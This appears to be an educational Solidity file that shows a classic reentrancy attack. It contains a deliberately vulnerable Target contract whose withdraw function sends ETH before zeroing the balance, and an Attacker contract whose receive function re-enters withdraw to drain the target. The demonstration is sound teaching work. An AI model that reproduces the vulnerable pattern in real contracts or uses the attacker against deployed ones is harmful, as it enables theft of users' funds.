// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;
import {console} from 'hardhat/console.sol';

contract Target {
    mapping(address => uint256) public balances;

    /// Sends ETH and updates in-contract balance of sender.
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /// Withdraws all ETH the caller has in-contract as per their balance.
    /// This is vulnerable to simple reentrancy and can be fixed by
    /// changing the balance state before transfering the ETH.
    function withdraw() public payable {
        uint256 amount = balances[msg.sender];
        // At the line below, the caller's receive function is executed.
        (bool sent, ) = msg.sender.call{value: amount}('');
        require(sent, 'Failed to send Ether');
        balances[msg.sender] = 0;
    }
}

contract Attacker {
    /// An interface to the target that will allow us to call its functions.
    Target public target;

    /// Tracks how many times the receive function is called.
    uint256 i;

    /// Set the target on deployment because we need it in storage
    /// to be able to call it from the receive function.
    constructor(address _target) {
        target = Target(_target);
    }

    /// Deposit ETH into the target contract. This updates the balance and allows us to
    /// have a certain amount of ETH sent to Attacker on each call to the withdraw function.
    function deposit() public payable {
        target.deposit{value: msg.value}();
    }

    /// Withdraw ETH from the target contract. This will call the receive function
    /// and allows us to take over the control flow.
    function attack() public payable {
        console.log('Attack begins.');
        target.withdraw();
    }

    /// This is called when the target contract sends ETH to this contract.
    /// We can use this to call the withdraw function again and again.
    /// This is the reentrancy.
    receive() external payable {
        console.log('Receive has been called %s times.', i);
        i++;
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
}
